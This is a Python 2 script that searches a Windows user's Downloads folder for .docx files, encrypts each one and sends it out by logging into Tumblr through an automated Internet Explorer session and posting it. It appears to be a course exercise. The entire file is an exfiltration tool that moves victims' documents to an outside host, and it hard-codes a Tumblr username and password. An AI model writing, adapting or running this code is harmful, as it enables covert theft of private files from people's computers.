'''
under lib/site-packages rename crypto folder to Crypto
'''

import win32com.client
import os
import fnmatch

from utils.browserutils import wait_for_browser
from utils.common import random_sleep
from utils.cryptoutils import encrypt_post

doc_type = ".docx"
username = "jms@gmail.com"
password = "justinBHP2014"


def login_to_tumblr(ie):

    #retrieve all elements in the document
    full_doc = ie.Document.all

    # iterate looking for the login form
    for i in full_doc:
        if i.id == "signup_email":
            i.setAttribute("value", username)
        elif i.id == "signup_password":
            i.setAttribute("value", password)
    random_sleep()

    # you can be presented with different home pages
    try:
        if ie.Document.forms[0].id == "signup_form":
            ie.Document.forms[0].submit()
        else:
            ie.Documents.forms[1].submit()
    except IndexError, e:
        print "Error found...", e
        pass

    random_sleep()

    # The login form is the second form of the page
    wait_for_browser(ie)

    return


def post_to_tumblr(ie,title,post):
    full_doc = ie.Document.all

    # Seems the field names to be updated has changed, I need to navigate using Developers toos on it again to find new names
    # until then, just printing here the values....
    print title
    print "***************"
    print post
    return

    for i in full_doc:
        if i.id != "":
            print i.id
        if i.id == "post_one":
            i.setAttribute("value", title)
            title_box = i
            i.focus()
        elif i.id == "post_two":
            i.setAttribute("innerHTML", post)
            print "set text area"
            i.focus()
        elif i.id == "create_post":
            print "Found Post button"
            post_form = i
            i.focus()


    # move focus away from the main content box
    # We have to shift focus away from the main content part of the post so that Tumblrs javascript enables post button
    # Things to find out with Chrome developer tools
    random_sleep()
    title_box.focus()
    random_sleep()

    # post the form
    post_form.children[0].click()
    wait_for_browser(ie)

    random_sleep()

    return


def exfiltrate(document_path):
    ie = win32com.client.Dispatch("InternetExplorer.Application")
    ie.Visible=1

    # head to tumblr and login
    ie.Navigate("http://www.tumblr.com/login")
    wait_for_browser(ie)

    print "Logging in..."
    login_to_tumblr(ie)
    print "Logged in... navigating"

    ie.Navigate("https://www.tumblr.com/new/text")
    wait_for_browser(ie)

    # encrypt the file
    title, body = encrypt_post(document_path)

    print "Creating new post..."
    post_to_tumblr(ie, title, body)
    print "Posted!"

    # destroy the IE instance
    ie.Quit()
    ie = None

    return

# main loop for document discovery
for parent, directories, filenames in os.walk("C:\\Users\\IEUser\\Downloads\\"):
    for filename in fnmatch.filter(filenames, "*%s" % doc_type):
        document_path = os.path.join(parent,filename)
        print "Found: %s" % document_path
        exfiltrate(document_path)
        raw_input("Continue?")